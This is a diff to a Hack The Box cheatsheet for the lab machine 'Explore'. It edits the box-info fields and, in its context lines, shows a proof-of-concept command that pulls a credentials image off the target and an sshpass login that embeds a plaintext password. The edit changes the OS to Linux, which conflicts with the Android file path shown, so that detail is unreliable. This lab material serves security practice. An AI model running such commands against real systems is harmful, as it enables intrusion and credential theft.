@@ -1,10 +1,8 @@
 # HTB: Explore — Command Cheatsheet
 
 ## 📌 Box Info
-- **Name:** Explore
-- **IP:** 10.10.10.247
-- **OS:** Android
-- **Difficulty:** Easy
+- **OS**: [Linux](Linux)
+- **Difficulty**: [Easy](Easy)
 
 ---
 
@@ -33,7 +31,7 @@ python poc.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247
 
 ---
 
-## 🗑️ Shell as kristi
+## 🗑️ [Shell](SSH) as kristi
 ```bash
 sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -p 2222 kristi@10.10.10.247
 
